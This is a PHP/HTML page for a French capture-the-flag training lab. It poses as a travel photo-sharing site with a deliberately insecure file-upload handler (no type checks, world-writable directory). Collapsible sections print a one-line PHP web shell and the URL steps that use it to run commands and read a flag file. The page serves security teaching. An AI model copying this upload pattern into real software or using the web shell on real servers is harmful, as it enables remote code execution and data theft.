<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VoyagePlus - Partagez vos souvenirs</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <!-- Header avec le thème DIABLE -->
    <header class="diable-header">
        <div class="header-content">
            <h1>✈️ VoyagePlus</h1>
            <p class="subtitle">Partagez vos plus beaux souvenirs de voyage</p>
        </div>
        <div class="header-glow"></div>
    </header>

    <main class="container">
        <!-- Message d'avertissement (comme le vrai site) -->
        <div class="warning-banner">
            <span class="glow-text">⚠️ MAINTENANCE</span> - Amélioration de nos services en cours
        </div>

        <!-- Section d'upload -->
        <section class="upload-section">
            <h2>📸 Ajouter une photo à la galerie</h2>
            
            <div class="upload-card">
                <form method="POST" enctype="multipart/form-data" class="upload-form">
                    <div class="form-group">
                        <label for="file">Sélectionnez votre photo (JPG, PNG)</label>
                        <input type="file" name="file" id="file" class="file-input" required>
                    </div>
                    
                    <button type="submit" class="btn-primary">
                        <span class="btn-glow"></span>
                        Publier ma photo
                    </button>
                </form>
                                    <!-- NOUVEAU : Bouton de nettoyage -->
                    <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid var(--border-color);">
                        <a href="reset.php" class="btn-clean" style="background: transparent; border: 1px solid var(--text-secondary); color: var(--text-secondary); padding: 8px 20px; border-radius: 4px; text-decoration: none; font-size: 0.9rem; transition: all 0.3s;">
                            🧹 Nettoyer la galerie
                        </a>
                    </div>

                <?php
                // ========== ZONE VULNÉRABLE ==========
                // Aucune vérification de sécurité - NE PAS FAIRE EN PRODUCTION
                
                if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
                    $target_dir = "uploads/";
                    $filename = basename($_FILES["file"]["name"]);
                    $target_file = $target_dir . $filename;
                    
                    // Créer le dossier uploads s'il n'existe pas
                    if (!file_exists($target_dir)) {
                        mkdir($target_dir, 0777, true);
                    }
                    
                    // VULNÉRABILITÉ : Aucune vérification du type de fichier !
                    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
                        echo '<div class="success-message">';
                        echo '✅ Fichier publié avec succès : <strong>' . htmlspecialchars($filename) . '</strong>';
                        echo '<br><a href="' . $target_file . '" target="_blank" class="file-link">Voir le fichier</a>';
                        echo '</div>';
                    } else {
                        echo '<div class="error-message">';
                        echo '❌ Erreur lors de la publication';
                        echo '</div>';
                    }
                }
                ?>
            </div>
        </section>

        <!-- Galerie des fichiers uploadés -->
        <section class="gallery-section">
            <h2>🖼️ Derniers partages</h2>
            
            <div class="gallery-grid">
                <?php
                $upload_dir = "uploads/";
                if (is_dir($upload_dir)) {
                    $files = scandir($upload_dir);
                    $file_count = 0;
                    
                    foreach ($files as $file) {
                        if ($file != "." && $file != "..") {
                            $file_count++;
                            echo '<div class="gallery-item">';
                            echo '<div class="file-icon">📁</div>';
                            echo '<a href="' . $upload_dir . $file . '" class="file-name">' . htmlspecialchars($file) . '</a>';
                            echo '<div class="file-size">' . round(filesize($upload_dir . $file) / 1024, 2) . ' KB</div>';
                            echo '</div>';
                        }
                    }
                    
                    if ($file_count === 0) {
                        echo '<p class="no-files">Aucune photo partagée pour le moment. Soyez le premier !</p>';
                    }
                } else {
                    echo '<p class="no-files">Dossier uploads non trouvé</p>';
                }
                ?>
            </div>
        </section>

        <!-- Section pédagogique (cachée mais accessible) -->
        <section class="info-section">
            <details>
                <summary>ℹ️ À propos de ce lab (info pédagogique)</summary>
                <div class="info-content">
                    <p><strong>Vulnérabilité:</strong> File Upload non sécurisé → RCE</p>
                    <p><strong>Objectif:</strong> Uploader un fichier <code>shell.php</code> contenant :</p>
                    <pre>&lt;?php system($_GET['cmd']); ?&gt;</pre>
                    <p><strong>Exploitation:</strong> <code>/uploads/shell.php?cmd=id</code></p>
                </div>
            </details>
        </section>
        <!-- Section Flag -->
        <section class="info-section" style="margin-top: 20px; border-left: 4px solid #FFD700;">
            <details>
                <summary>🏆 VALIDATION - Flag à trouver</summary>
                <div class="info-content">
                    <p><strong>Objectif :</strong> Lire le fichier <code>/tmp/flag.txt</code> sur le serveur.</p>
                    
                    <div style="background: #1a1a1a; padding: 15px; border-radius: 5px; margin: 10px 0;">
                        <p style="color: #FFD700; font-weight: bold;">🎯 Méthode :</p>
                        <ol style="color: var(--text-secondary);">
                            <li>Uploader <code>shell.php</code> avec le contenu :</li>
                            <pre style="background: #000; color: #0f0;">&lt;?php system($_GET['cmd']); ?&gt;</pre>
                            <li>Exécuter la commande :</li>
                            <pre style="background: #000; color: #0f0;">http://localhost:8080/uploads/shell.php?cmd=cat%20/tmp/flag.txt</pre>
                        </ol>
                    </div>
                    
                    <div style="background: #0a1a0a; padding: 15px; border-radius: 5px; margin-top: 15px; text-align: center;">
                        <p style="color: #FFD700; font-weight: bold;">🔑 Le flag à trouver :</p>
                        <p style="font-size: 1.5rem; font-family: monospace; letter-spacing: 2px; background: #000; padding: 10px; border-radius: 5px; color: #0f0;">
                            FLAG{????????????????}
                        </p>
                        <p style="color: var(--text-secondary); font-size: 0.9rem;">(12 caractères, format FLAG{...})</p>
                    </div>
                    
                    <p style="margin-top: 15px; color: #ff9999;">
                        ⚠️ À COMMUNIQUER À L'ÉQUIPE WP1/WP2 : Quand tu trouves le flag, envoie-le dans le groupe pour valider que l'attaque fonctionne.
                    </p>
                </div>
            </details>
        </section>
    </main>

    <!-- Footer DIABLE -->
    <footer class="diable-footer">
        <p>Lab DIABLE v3.0 - DSI ISFA 2025-2026</p>
        <p class="small">File Upload to RCE Lab | Auteur: [Ton Prénom]</p>
    </footer>
</body>
</html>
